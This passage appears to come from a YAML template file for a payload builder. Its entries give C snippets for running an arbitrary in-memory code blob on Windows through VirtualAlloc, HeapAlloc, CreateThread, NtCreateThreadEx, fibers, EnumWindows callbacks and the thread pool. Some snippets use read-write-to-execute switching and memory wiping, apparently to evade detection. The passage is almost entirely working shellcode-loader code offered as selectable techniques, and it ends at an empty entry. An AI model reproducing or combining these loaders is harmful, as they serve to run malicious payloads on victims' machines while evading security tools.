      {
          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (execMem == NULL) return -1;

          memcpy(execMem, code_blob, code_blob_len);

          DWORD oldProtect;
          if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
              VirtualFree(execMem, 0, MEM_RELEASE);
              return -1;
          }

          ((void(*)())execMem)();

          VirtualFree(execMem, 0, MEM_RELEASE);
      }

  - id: HeapExec
    display: Heap-Based Execution
    default: false
    snippet: |
      // Execute via HeapAlloc
      {
          HANDLE hHeap = GetProcessHeap();
          void* execMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, code_blob_len);
          if (execMem == NULL) return -1;

          memcpy(execMem, code_blob, code_blob_len);

          DWORD oldProtect;
          if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
              HeapFree(hHeap, 0, execMem);
              return -1;
          }

          __try { ((void(*)())execMem)(); }
          __except(EXCEPTION_EXECUTE_HANDLER) {}

          VirtualProtect(execMem, code_blob_len, oldProtect, &oldProtect);
          HeapFree(hHeap, 0, execMem);
      }

  - id: CreateThread
    display: Thread-Based Execution
    default: false
    snippet: |
      // Execute via CreateThread
      {
          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (execMem == NULL) return -1;

          memcpy(execMem, code_blob, code_blob_len);

          DWORD oldProtect;
          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);

          HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
          if (hThread) {
              WaitForSingleObject(hThread, INFINITE);
              CloseHandle(hThread);
          }

          VirtualFree(execMem, 0, MEM_RELEASE);
      }

  - id: NtCreateThreadEx
    display: Native Thread Creation
    default: false
    snippet: |
      // Execute via NtCreateThreadEx
      {
          typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (execMem == NULL) return -1;

          memcpy(execMem, code_blob, code_blob_len);

          DWORD oldProtect;
          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);

          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          if (ntdll) {
              pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
              if (NtCreateThreadEx) {
                  HANDLE hThread = NULL;
                  NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
                                                     execMem, NULL, 0, 0, 0, 0, NULL);
                  if (hThread) {
                      WaitForSingleObject(hThread, INFINITE);
                      CloseHandle(hThread);
                  }
              }
          }

          VirtualFree(execMem, 0, MEM_RELEASE);
      }

  - id: FiberExec
    display: Fiber-Based Execution
    default: false
    snippet: |
      // Execute via Fibers
      {
          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (execMem == NULL) return -1;

          memcpy(execMem, code_blob, code_blob_len);

          DWORD oldProtect;
          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);

          PVOID mainFiber = ConvertThreadToFiber(NULL);
          if (mainFiber) {
              PVOID stubFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
              if (stubFiber) {
                  __try { SwitchToFiber(stubFiber); }
                  __except(EXCEPTION_EXECUTE_HANDLER) {}
                  DeleteFiber(stubFiber);
              }
              ConvertFiberToThread();
          }

          VirtualFree(execMem, 0, MEM_RELEASE);
      }

  - id: CallbackExec
    display: Callback Execution
    default: false
    snippet: |
      // Execute via callback function (EnumWindows)
      {
          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (execMem == NULL) return -1;

          memcpy(execMem, code_blob, code_blob_len);

          DWORD oldProtect;
          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);

          __try { EnumWindows((WNDENUMPROC)execMem, 0); }
          __except(EXCEPTION_EXECUTE_HANDLER) {}

          VirtualFree(execMem, 0, MEM_RELEASE);
      }

  - id: ThreadPoolExec
    display: Thread Pool Execution
    default: false
    snippet: |
      // Execute via Windows Thread Pool
      {
          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (execMem == NULL) return -1;

          memcpy(execMem, code_blob, code_blob_len);

          DWORD oldProtect;
          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);

          PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)execMem, NULL, NULL);
          if (work) {
              SubmitThreadpoolWork(work);
              WaitForThreadpoolWorkCallbacks(work, FALSE);
              CloseThreadpoolWork(work);
          }

          VirtualFree(execMem, 0, MEM_RELEASE);
      }

  - id: SecureExec
    display: Secure Execution with Cleanup
    default: false
    snippet: |
      // Secure execution with memory zeroing
      {
          static volatile BOOL g_SafeToRun = TRUE;
          if (!g_SafeToRun) return 0;

          void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (!mem) return -1;

          memcpy(mem, code_blob, code_blob_len);
          SecureZeroMemory(code_blob, code_blob_len);

          DWORD old;
          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);

          if (!g_SafeToRun) { VirtualFree(mem, 0, MEM_RELEASE); return 0; }

          __try { ((void(*)())mem)(); }
          __except(EXCEPTION_EXECUTE_HANDLER) {}

          VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
          SecureZeroMemory(mem, code_blob_len);
          VirtualFree(mem, 0, MEM_RELEASE);
      }

  - id: RWtoRX
    display: RX Memory Protection
    default: false
    snippet: |
      // Allocate RW, copy, then protect as RX (not RWX)
      {
          void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (!mem) return -1;
          memcpy(mem, code_blob, code_blob_len);
          DWORD old;
          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
          __try { ((void(*)())mem)(); }
          __except(EXCEPTION_EXECUTE_HANDLER) {}
          VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
          SecureZeroMemory(mem, code_blob_len);
          VirtualFree(mem, 0, MEM_RELEASE);
      }

  - id: SyscallExec
    display: Native Thread Creation
    default: false
    snippet: |
      // Execute via NtCreateThreadEx
      {
          typedef NTSTATUS (NTAPI *pNtCTE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
          void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          memcpy(mem, code_blob, code_blob_len);
          DWORD old;
          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);

          pNtCTE NtCTE = (pNtCTE)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
          HANDLE hThread = NULL;
          if (NtCTE) {
              NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), mem, NULL, 0, 0, 0, 0, NULL);
              if (hThread) {
                  WaitForSingleObject(hThread, INFINITE);
                  CloseHandle(hThread);
              }
          }
          VirtualFree(mem, 0, MEM_RELEASE);
      }

  - id: DirectExec
    display: Direct Function Call
    default: false
    snippet: |
      // Minimal execution via VirtualAlloc + function pointer
